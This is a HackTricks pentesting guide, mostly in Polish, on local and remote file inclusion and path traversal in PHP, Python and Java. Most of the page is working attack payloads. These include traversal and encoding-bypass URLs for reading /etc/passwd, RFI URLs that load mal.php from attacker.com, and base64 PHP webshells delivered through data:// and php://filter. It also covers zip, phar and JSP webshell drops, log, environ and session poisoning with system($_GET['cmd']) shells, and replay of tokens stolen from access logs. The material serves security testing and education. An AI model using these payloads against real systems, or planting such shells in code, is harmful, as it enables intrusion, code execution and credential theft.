# File Inclusion/Path traversal

{{#include ../../banners/hacktricks-training.md}}

## File Inclusion

**Remote File Inclusion (RFI):** Plik jest ładowany z zdalnego serwera (Najlepsze: możesz napisać kod, a serwer go wykona). W PHP jest to **wyłączone** domyślnie (**allow_url_include**).\
**Local File Inclusion (LFI):** Serwer ładuje lokalny plik.

Luka występuje, gdy użytkownik w pewien sposób kontroluje plik, który zostanie załadowany przez serwer.

Podatne **funkcje PHP**: require, require_once, include, include_once

Przydatne narzędzie do eksploatacji tej luki: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## Blind - Interesting - LFI2RCE files
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**Łącząc kilka list *nix LFI i dodając więcej ścieżek stworzyłem tę:**


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt
{{#endref}}

Spróbuj również zamienić `/` na `\`\
Spróbuj również dodać `../../../../../`

Lista, która wykorzystuje kilka technik do znalezienia pliku /etc/password (aby sprawdzić, czy luka istnieje) znajduje się [tutaj](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt)

### **Windows**

Scalenie różnych wordlists:


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt
{{#endref}}

Spróbuj również zamienić `/` na `\`\
Spróbuj również usunąć `C:/` i dodać `../../../../../`

Lista, która wykorzystuje kilka technik do znalezienia pliku /boot.ini (aby sprawdzić, czy luka istnieje) znajduje się [tutaj](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt)

### **OS X**

Sprawdź listę LFI dla linux.

## Podstawowe LFI i obejścia

Wszystkie przykłady dotyczą Local File Inclusion, ale mogą być również zastosowane do Remote File Inclusion (page=[http://myserver.com/phpshellcode.txt\\](<http://myserver.com/phpshellcode.txt)//>).
```
http://example.com/index.php?page=../../../etc/passwd
```
### traversal sequences usuwane nierekurencyjnie
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **Null byte (%00)**

Bypass dodawania dodatkowych znaków na końcu podanego ciągu (bypass of: $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
To zostało rozwiązane od wersji **PHP 5.4**

### **Kodowanie**

Możesz użyć niestandardowych kodowań, takich jak double URL encode (i inne):
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### Z istniejącego folderu

Może back-end sprawdza ścieżkę do folderu:
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### Eksplorowanie katalogów systemu plików na serwerze

System plików serwera można przeszukiwać rekursywnie, aby zidentyfikować katalogi, a nie tylko pliki, stosując pewne techniki. Proces ten polega na określeniu głębokości katalogu i sprawdzaniu istnienia konkretnych folderów. Poniżej znajduje się szczegółowa metoda, jak to osiągnąć:

1. **Określenie głębokości katalogu:** Ustal głębokość bieżącego katalogu, pomyślnie pobierając plik `/etc/passwd` (dotyczy to, jeśli serwer działa na Linuxie). Przykładowy URL może być zbudowany w następujący sposób, wskazując głębokość równą trzem:
```bash
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
2. **Sprawdź foldery:** Dodaj nazwę podejrzanego folderu (np. `private`) do URL, a następnie wróć do `/etc/passwd`. Dodatkowy poziom katalogu wymaga zwiększenia głębokości o jeden:
```bash
http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
```
3. **Zinterpretuj wyniki:** Odpowiedź serwera wskazuje, czy folder istnieje:
- **Błąd / Brak odpowiedzi:** Folder `private` prawdopodobnie nie istnieje w określonej lokalizacji.
- **Zawartość `/etc/passwd`:** Obecność folderu `private` zostaje potwierdzona.
4. **Eksploracja rekurencyjna:** Odkryte foldery można dalej sprawdzać pod kątem podkatalogów lub plików, używając tej samej techniki lub tradycyjnych metod Local File Inclusion (LFI).

Aby przeszukać katalogi w innych lokalizacjach systemu plików, dostosuj payload odpowiednio. Na przykład, aby sprawdzić, czy `/var/www/` zawiera katalog `private` (zakładając, że bieżący katalog znajduje się na głębokości 3), użyj:
```bash
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
### **Path Truncation Technique**

Path truncation to metoda stosowana do manipulowania ścieżkami plików w aplikacjach webowych. Często jest używana do uzyskania dostępu do plików z ograniczonym dostępem poprzez obejście niektórych zabezpieczeń, które dopisują dodatkowe znaki na końcu ścieżek plików. Celem jest przygotowanie ścieżki pliku, która po modyfikacji przez zabezpieczenie nadal wskazuje na pożądany plik.

W PHP różne reprezentacje ścieżki pliku mogą być traktowane jako równoważne ze względu na charakter systemu plików. Na przykład:

- `/etc/passwd`, `/etc//passwd`, `/etc/./passwd`, and `/etc/passwd/` are all treated as the same path.
- Gdy ostatnie 6 znaków to `passwd`, dodanie `/` (tworząc `passwd/`) nie zmienia docelowego pliku.
- Podobnie, jeśli do ścieżki pliku dopisane jest `.php` (np. `shellcode.php`), dodanie na końcu `/.` nie zmieni pliku, do którego następuje dostęp.

Poniższe przykłady pokazują, jak wykorzystać path truncation do dostępu do `/etc/passwd`, częstego celu ze względu na jego wrażliwą zawartość (informacje o kontach użytkowników):
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
```

```
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
W tych scenariuszach liczba wymaganych traversals może wynosić około 2027, ale ta wartość może się różnić w zależności od konfiguracji serwera.

- **Użycie Dot Segments i dodatkowych znaków**: Traversal sequences (`../`) w połączeniu z dodatkowymi segmentami kropkowymi i znakami mogą być użyte do nawigacji po systemie plików, skutecznie ignorując ciągi dołączane przez serwer.
- **Określenie wymaganej liczby Traversals**: Metodą prób i błędów można znaleźć dokładną liczbę sekwencji `../` potrzebną do przejścia do katalogu root, a następnie do `/etc/passwd`, upewniając się, że wszelkie dołączone ciągi (np. `.php`) zostaną zneutralizowane, a żądana ścieżka (`/etc/passwd`) pozostanie nienaruszona.
- **Rozpoczynanie od fałszywego katalogu**: Częstą praktyką jest rozpoczęcie ścieżki od nieistniejącego katalogu (np. `a/`). Technika ta stosowana jest jako środek ostrożności albo w celu spełnienia wymagań logiki parsowania ścieżek po stronie serwera.

Przy stosowaniu technik path truncation kluczowe jest zrozumienie sposobu parsowania ścieżek przez serwer oraz struktury systemu plików. Każdy scenariusz może wymagać innego podejścia, a testy są często niezbędne do znalezienia najbardziej efektywnej metody.

**This vulnerability was corrected in PHP 5.3.**

### **Sztuczki omijania filtrów**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## Remote File Inclusion

W php jest to domyślnie wyłączone, ponieważ **`allow_url_include`** jest **Off.** Musi być **On**, żeby to działało, i w takim przypadku możesz dołączyć plik PHP z twojego serwera i uzyskać RCE:
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
Jeśli z jakiegoś powodu **`allow_url_include`** jest **On**, ale PHP **filtruje** dostęp do zewnętrznych stron WWW, [według tego wpisu](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/), możesz użyć na przykład protokołu data z base64, aby zdekodować b64 PHP code i uzyskać RCE:
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
> [!TIP]
> W poprzednim kodzie końcowe `+.txt` zostało dodane, ponieważ atakujący potrzebował stringu kończącego się na `.txt`, więc string kończy się tym i po dekodowaniu b64 ta część zwróci tylko śmieci, a rzeczywisty kod PHP zostanie dołączony (i w związku z tym wykonany).

Inny przykład **nie używający protokołu `php://`** to:
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
## Element root w Pythonie

W Pythonie, w kodzie takim jak ten:
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
Jeśli użytkownik poda **ścieżkę bezwzględną** jako **`file_name`**, **poprzednia ścieżka jest po prostu usuwana**:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
Jest to zamierzone zachowanie zgodnie z [the docs](https://docs.python.org/3.10/library/os.path.html#os.path.join):

> Jeśli komponent jest ścieżką bezwzględną, wszystkie poprzednie komponenty są odrzucone, a łączenie kontynuuje się od komponentu będącego ścieżką bezwzględną.

## Java List Directories

Wygląda na to, że jeśli masz Path Traversal w Java i **poprosisz o katalog** zamiast o plik, zostanie zwrócona **lista zawartości katalogu**. To nie będzie miało miejsca w innych językach (o ile mi wiadomo).

## Top 25 parametrów

Oto lista top 25 parametrów, które mogą być podatne na local file inclusion (LFI) vulnerabilities (from [link](https://twitter.com/trbughunters/status/1279768631845494787)):
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI używając PHP wrapperów i protokołów

### php://filter

PHP filters pozwalają wykonywać podstawowe **operacje modyfikacji danych** zanim zostaną odczytane lub zapisane. Istnieje 5 kategorii filtrów:

- [String Filters](https://www.php.net/manual/en/filters.string.php):
- `string.rot13`
- `string.toupper`
- `string.tolower`
- `string.strip_tags`: Remove tags from the data (everything between "<" and ">" chars)
- Note that this filter has disappear from the modern versions of PHP
- [Conversion Filters](https://www.php.net/manual/en/filters.convert.php)
- `convert.base64-encode`
- `convert.base64-decode`
- `convert.quoted-printable-encode`
- `convert.quoted-printable-decode`
- `convert.iconv.*` : Transformuje do innego kodowania (`convert.iconv.<input_enc>.<output_enc>`). Aby uzyskać **listę wszystkich obsługiwanych kodowań**, uruchom w konsoli: `iconv -l`

> [!WARNING]
> Nadużywając filtra konwersji `convert.iconv.*` możesz **wygenerować dowolny tekst**, co może być przydatne do zapisania dowolnego tekstu lub sprawienia, by funkcja taka jak include przetwarzała dowolny tekst. For more info check [**LFI2RCE via php filters**](lfi2rce-via-php-filters.md).

- [Compression Filters](https://www.php.net/manual/en/filters.compression.php)
- `zlib.deflate`: Compress the content (useful if exfiltrating a lot of info)
- `zlib.inflate`: Decompress the data
- [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php)
- `mcrypt.*` : Przestarzałe
- `mdecrypt.*` : Przestarzałe
- Other Filters
- Running in php `var_dump(stream_get_filters());` you can find a couple of **unexpected filters**:
- `consumed`
- `dechunk`: reverses HTTP chunked encoding
- `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
> [!WARNING]
> Część "php://filter" nie rozróżnia wielkości liter

### Using php filters as oracle to read arbitrary files

[**In this post**](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle) proponowana jest technika odczytu lokalnego pliku bez otrzymania wyjścia zwracanego przez serwer. Ta technika opiera się na **boolean exfiltration of the file (char by char) using php filters** jako oracle. Dzieje się tak, ponieważ php filters mogą być użyte do powiększenia tekstu na tyle, by php rzucił wyjątek.

W oryginalnym poście znajdziesz szczegółowe wyjaśnienie techniki, poniżej szybkie streszczenie:

- Użyj kodeka **`UCS-4LE`**, aby pozostawić początkowy znak tekstu na początku i sprawić, że rozmiar ciągu zwiększa się wykładniczo.
- To posłuży do wygenerowania **tekstu tak dużego, że gdy początkowa litera zostanie zgadnięta prawidłowo** php wywoła **błąd**.
- Filtr **dechunk** **usunie wszystko, jeśli pierwszy znak nie jest szesnastkowy**, więc możemy dowiedzieć się, czy pierwszy znak jest szesnastkowy.
- To, w połączeniu z poprzednim (i innymi filtrami zależnymi od zgadywanej litery), pozwoli odgadnąć literę na początku tekstu, obserwując, kiedy po wykonaniu wystarczającej liczby transformacji przestaje ona być znakiem szesnastkowym. Jeśli jest hex, dechunk jej nie usunie, a początkowa bomba spowoduje błąd php.
- Kodek **convert.iconv.UNICODE.CP930** zamienia każdą literę na następną (więc po tym kodeku: a -> b). To pozwala odkryć, czy pierwsza litera jest np. `a`, ponieważ jeśli zastosujemy ten kodek 6 razy: a->b->c->d->e->f->g, litera przestaje być znakiem szesnastkowym, dlatego dechunk jej nie usuwa i błąd php jest wywoływany, ponieważ mnoży się z początkową bombą.
- Używając innych transformacji jak **rot13** na początku, możliwe jest leak innych znaków, takich jak n, o, p, q, r (i inne kodeki mogą być użyte, by przesunąć inne litery do zakresu szesnastkowego).
- Gdy początkowy znak jest cyfrą, trzeba zakodować go w base64 i leak pierwsze 2 litery, aby leak liczbę.
- Ostatnim problemem jest ustalenie, **jak leaknąć więcej niż początkowa litera**. Poprzez użycie filtrów zmieniających kolejność bajtów takich jak **convert.iconv.UTF16.UTF-16BE, convert.iconv.UCS-4.UCS-4LE, convert.iconv.UCS-4.UCS-4LE** możliwe jest zmienienie kolejności znaków i umieszczenie na pierwszej pozycji innych liter tekstu.
- A aby móc uzyskać **dalsze dane**, pomysł polega na **wygenerowaniu 2 bajtów danych śmieciowych na początku** za pomocą **convert.iconv.UTF16.UTF16**, zastosowaniu **UCS-4LE** aby **zrobić pivot z następnymi 2 bajtami**, a następnie **usunąć dane aż do danych śmieciowych** (to usunie pierwsze 2 bajty początkowego tekstu). Kontynuuj to aż dojdziesz do żądanego bitu do leak.

W poście opublikowano także narzędzie do wykonania tego automatycznie: [php_filters_chain_oracle_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit).

### php://fd

This wrapper allows to access file descriptors that the process has open. Potentially useful to exfiltrate the content of opened files:
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
Możesz także użyć **php://stdin, php://stdout and php://stderr** aby uzyskać dostęp odpowiednio do **file descriptors 0, 1 and 2** (nie jestem pewien, jak mogłoby to być przydatne w ataku)

### zip:// and rar://

Prześlij plik Zip lub Rar z PHPShell wewnątrz i uzyskaj do niego dostęp.\
Aby móc nadużywać rar protocol, **musi być specjalnie aktywowany**.
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
Zwróć uwagę, że ten protokół jest ograniczony przez konfiguracje php **`allow_url_open`** i **`allow_url_include`**

### expect://

Expect musi być aktywowany. Możesz wykonać kod używając tego:
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

Określ swój payload w parametrach POST:
```bash
curl -XPOST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```
### phar://

Plik `.phar` może być wykorzystany do wykonania kodu PHP, gdy aplikacja webowa używa funkcji takich jak `include` do ładowania plików. Poniższy fragment kodu PHP demonstruje stworzenie pliku `.phar`:
```php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');
$phar->stopBuffering();
```
Aby skompilować plik `.phar`, należy wykonać następujące polecenie:
```bash
php --define phar.readonly=0 create_path.php
```
Po uruchomieniu zostanie utworzony plik o nazwie `test.phar`, który potencjalnie może zostać wykorzystany do eksploatacji podatności Local File Inclusion (LFI).

W przypadkach, gdy LFI jedynie odczytuje pliki bez wykonywania zawartego w nich kodu PHP (np. przez funkcje takie jak `file_get_contents()`, `fopen()`, `file()`, `file_exists()`, `md5_file()`, `filemtime()` lub `filesize()`), można próbować wykorzystania podatności typu deserialization. Ta podatność wiąże się z odczytem plików przy użyciu protokołu `phar`.

For a detailed understanding of exploiting deserialization vulnerabilities in the context of `.phar` files, refer to the document linked below:

[Phar Deserialization Exploitation Guide](phar-deserialization.md)


{{#ref}}
phar-deserialization.md
{{#endref}}

### CVE-2024-2961

Możliwe było nadużycie **any arbitrary file read from PHP that supports php filters** w celu uzyskania RCE. Szczegółowy opis można [**found in this post**](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)**.**\
Bardzo krótkie podsumowanie: **3 byte overflow** w heap PHP został wykorzystany do **alter the chain of free chunks** o określonym rozmiarze, aby móc **write anything in any address**, więc dodano hook wywołujący **`system`**.\
Możliwe było alokowanie chunków o konkretnych rozmiarach poprzez nadużycie dodatkowych php filters.

### More protocols

Sprawdź więcej możliwych [ **protocols to include here**](https://www.php.net/manual/en/wrappers.php)**:**

- [php://memory and php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) — Zapis w pamięci lub w pliku tymczasowym (nie jestem pewien, jak może to być użyteczne w ataku file inclusion)
- [file://](https://www.php.net/manual/en/wrappers.file.php) — Dostęp do lokalnego filesystem
- [http://](https://www.php.net/manual/en/wrappers.http.php) — Dostęp do URLi HTTP(s)
- [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) — Dostęp do serwerów FTP(s)
- [zlib://](https://www.php.net/manual/en/wrappers.compression.php) — Strumienie kompresji
- [glob://](https://www.php.net/manual/en/wrappers.glob.php) — Znajdowanie ścieżek pasujących do wzorca (nie zwraca nic czytelnego, więc nie jest tu zbytnio przydatny)
- [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) — Secure Shell 2
- [ogg://](https://www.php.net/manual/en/wrappers.audio.php) — Strumienie audio (nieprzydatne do odczytu dowolnych plików)

## LFI przez 'assert' w PHP

Ryzyko związane z Local File Inclusion (LFI) w PHP jest szczególnie wysokie w kontekście funkcji 'assert', która potrafi wykonywać kod zawarty w stringach. Jest to szczególnie problematyczne, jeśli wejście zawierające znaki directory traversal, takie jak "..", jest sprawdzane, ale nie jest odpowiednio sanityzowane.

For example, PHP code might be designed to prevent directory traversal like so:
```bash
assert("strpos('$file', '..') === false") or die("");
```
Chociaż ma to na celu zapobieganie traversal, niezamierzenie tworzy wektor do code injection. Aby wykorzystać to do odczytu zawartości pliku, atakujący mógłby użyć:
```plaintext
' and die(highlight_file('/etc/passwd')) or '
```
Podobnie, do wykonywania dowolnych poleceń systemowych można użyć:
```plaintext
' and die(system("id")) or '
```
It's important to **URL-encode these payloads**.

## PHP Blind Path Traversal

> [!WARNING]
> Ta technika ma zastosowanie w sytuacjach, gdy masz **kontrolę** nad **ścieżką pliku** przekazywaną do **funkcji PHP**, która **uzyska dostęp do pliku**, ale nie zobaczysz jego zawartości (np. proste wywołanie **`file()`**), mimo że zawartość nie jest wyświetlana.

W [**this incredible post**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html) wyjaśniono, jak blind path traversal może być nadużyty za pomocą filtrów PHP, by **exfiltrate the content of a file via an error oracle**.

Podsumowując, technika polega na użyciu **"UCS-4LE" encoding** aby powiększyć zawartość pliku tak bardzo, że **PHP function otwierająca** plik wywoła **błąd**.

Następnie, aby uzyskać 'leak' pierwszego znaku, używany jest filtr **`dechunk`** wraz z innymi, takimi jak **base64** lub **rot13**, a na końcu filtry **convert.iconv.UCS-4.UCS-4LE** i **convert.iconv.UTF16.UTF-16BE** są używane, aby **umieścić inne znaki na początku i je leak**.

**Functions that might be vulnerable**: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (only target read only with this)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

For the technical details check the mentioned post!

## LFI2RCE

### Arbitrary File Write via Path Traversal (Webshell RCE)

Gdy kod po stronie serwera, który przyjmuje/wgrywa pliki, buduje docelową ścieżkę używając danych kontrolowanych przez użytkownika (np. nazwy pliku lub URL) bez kanonizowania i walidacji, segmenty `..` i ścieżki absolutne mogą wydostać się poza zamierzoną katalog i spowodować arbitrary file write. Jeśli możesz umieścić payload w katalogu wystawionym do sieci, zwykle uzyskujesz unauthenticated RCE przez wrzucenie webshell.

Typowy przebieg eksploatacji:
- Zidentyfikuj write primitive w endpointzie lub background workerze, który przyjmuje ścieżkę/nazwę pliku i zapisuje zawartość na dysku (np. message-driven ingestion, XML/JSON command handlers, ZIP extractors itp.).
- Określ katalogi wystawione w sieci. Typowe przykłady:
- Apache/PHP: `/var/www/html/`
- Tomcat/Jetty: `<tomcat>/webapps/ROOT/` → drop `shell.jsp`
- IIS: `C:\inetpub\wwwroot\` → drop `shell.aspx`
- Przygotuj traversal path, który wyłamie się z zamierzonego katalogu storage do webroot i umieść w nim zawartość webshell.
- Przejdź do wrzuconego payload i wykonaj polecenia.

Uwagi:
- Usługa wykonująca zapis może nasłuchiwać na porcie nie-HTTP (np. JMF XML listener na TCP 4004). Główne webowe UI (na innym porcie) później będzie serwować twój payload.
- Na stosach Java zapisy plików często są implementowane prostym konkatenowaniem `File`/`Paths`. Brak kanonizowania/allow-listingu jest główną wadą.

Generic XML/JMF-style example (product schemas vary – the DOCTYPE/body wrapper is irrelevant for the traversal):
```xml
<?xml version="1.0" encoding="UTF-8"?>
<JMF SenderID="hacktricks" Version="1.3">
<Command Type="SubmitQueueEntry">
<!-- Write outside the intake folder into the webroot via traversal -->
<Resource Name="FileName">../../../webapps/ROOT/shell.jsp</Resource>
<Data>
<![CDATA[
<%@ page import="java.io.*" %>
<%
String c = request.getParameter("cmd");
if (c != null) {
Process p = Runtime.getRuntime().exec(c);
try (var in = p.getInputStream(); var out = response.getOutputStream()) {
in.transferTo(out);
}
}
%>
]]>
</Data>
</Command>
</JMF>
```
Hardening, który eliminuje tę klasę błędów:
- Rozwiązuj do ścieżki kanonicznej i wymuszaj, że jest ona potomkiem dozwolonego katalogu bazowego.
- Odrzucaj ścieżki zawierające `..`, ścieżki absolutne lub litery dysków; preferuj generowane nazwy plików.
- Uruchamiaj proces zapisu jako konto o ograniczonych uprawnieniach i oddziel katalogi zapisu od katalogów serwowanych przez serwer.

## Remote File Inclusion

Wyjaśniono wcześniej — [**skorzystaj z tego linku**](#remote-file-inclusion).

### Via Apache/Nginx log file

Jeśli serwer Apache lub Nginx jest **podatny na LFI** w funkcji include, możesz spróbować uzyskać dostęp do **`/var/log/apache2/access.log` lub `/var/log/nginx/access.log`**, umieścić w **user agent** lub w **GET parameter** php shell taki jak **`<?php system($_GET['c']); ?>`** i załączyć ten plik

> [!WARNING]
> Zwróć uwagę, że **jeśli użyjesz podwójnych cudzysłowów** dla shella zamiast **pojedynczych**, podwójne cudzysłowy zostaną zmienione na string "_**quote;**_", **PHP zgłosi błąd** i **nic więcej nie zostanie wykonane**.
>
> Upewnij się także, że **prawidłowo zapisujesz payload** lub PHP będzie zgłaszać błąd za każdym razem, gdy spróbuje wczytać plik logu i nie będziesz mieć drugiej szansy.

To można też zrobić w innych logach, ale **uważaj,** kod w logach może być URL encoded i to może zniszczyć Shell. Nagłówek **authorisation "basic"** zawiera "user:password" w Base64 i jest dekodowany w logach. PHPShell można wstawić do tego nagłówka.\
Other possible log paths:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Fuzzing wordlist: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### Odczyt access logs, aby zebrać GET-based auth tokens (token replay)

Wiele aplikacji błędnie akceptuje session/auth tokens przez GET (np. AuthenticationToken, token, sid). Jeśli masz path traversal/LFI primitive do web server logs, możesz ukraść te tokeny z access logs i replayować je, aby całkowicie obejść uwierzytelnianie.

How-to:
- Użyj traversal/LFI, aby odczytać web server access log. Typowe lokalizacje:
- /var/log/apache2/access.log, /var/log/httpd/access_log
- /var/log/nginx/access.log
- Niektóre endpointy zwracają odczyty plików Base64-encoded. Jeśli tak, zdekoduj lokalnie i przejrzyj linie logów.
- Grepuj żądania GET zawierające parametr token i wyciągnij jego wartość, następnie replayuj ją względem punktu wejścia aplikacji.

Przykładowy przebieg (ogólny):
```http
GET /vuln/asset?name=..%2f..%2f..%2f..%2fvar%2flog%2fapache2%2faccess.log HTTP/1.1
Host: target
```
Zdekoduj treść, jeśli jest w Base64, a następnie odtwórz przechwycony token:
```http
GET /portalhome/?AuthenticationToken=<stolen_token> HTTP/1.1
Host: target
```
Uwagi:
- Tokeny w URL-ach są rejestrowane domyślnie; nigdy nie akceptuj tokenów typu bearer przez GET w systemach produkcyjnych.
- Jeśli aplikacja obsługuje wiele nazw tokenów, szukaj typowych kluczy takich jak AuthenticationToken, token, sid, access_token.
- Regeneruj wszystkie tokeny, które mogły zostać leaked do logów.

### Przez e-mail

**Wyślij wiadomość** do konta wewnętrznego (user@localhost) zawierającą twój PHP payload jak `<?php echo system($_REQUEST["cmd"]); ?>` i spróbuj dołączyć ją do maila użytkownika, używając ścieżki takiej jak **`/var/mail/<USERNAME>`** lub **`/var/spool/mail/<USERNAME>`**

### Via /proc/*/fd/*

1. Wgraj dużo shells (na przykład: 100)
2. Include [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD), przy czym $PID = PID procesu (może być brute forced) a $FD to deskryptor pliku (również może być brute forced)

### Via /proc/self/environ

Podobnie jak w przypadku pliku logu, wyślij payload w User-Agent, zostanie on odzwierciedlony w pliku /proc/self/environ
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### Przez przesłanie pliku

Jeśli możesz przesłać plik, po prostu wstrzyknij shell payload do niego (np.: `<?php system($_GET['c']); ?>`).
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
Aby plik pozostał czytelny, najlepiej wstrzykiwać to do metadanych obrazów/dokumentów/pdf

### Przez przesłanie pliku ZIP

Prześlij plik ZIP zawierający skompresowany PHP shell i uzyskaj dostęp:
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### Za pomocą sesji PHP

Sprawdź, czy strona używa sesji PHP (PHPSESSID)
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
W PHP te sessions są przechowywane w _/var/lib/php5/sess\\_\[PHPSESSID]\_ plikach
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
Ustaw cookie na `<?php system('cat /etc/passwd');?>`
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
Użyj LFI, aby dołączyć plik sesji PHP
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
